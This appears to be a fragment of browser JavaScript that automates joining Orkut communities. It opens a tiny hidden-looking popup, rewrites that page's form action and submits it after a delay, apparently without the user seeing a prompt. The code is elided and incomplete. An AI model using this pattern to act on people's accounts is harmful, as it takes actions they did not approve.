...
var script_ = function joinComunidade(){
	...
	var p=d.match(/.CommunityJoin.aspx(.*)cmm=(\d+)/gi);
	...
	function sayjoin(cmm){
		scrap = window.open("http://www.orkut.com/Community.aspx?"+cmm,'','width=50,height=50');
		setTimeout('joinm("'+cmm+'")',3000);
	}
	function joinm(cmm){
		form=scrap.document.forms[0];
		form.action='CommunityJoin.aspx?Action.join&'+cmm;
		form.submit();
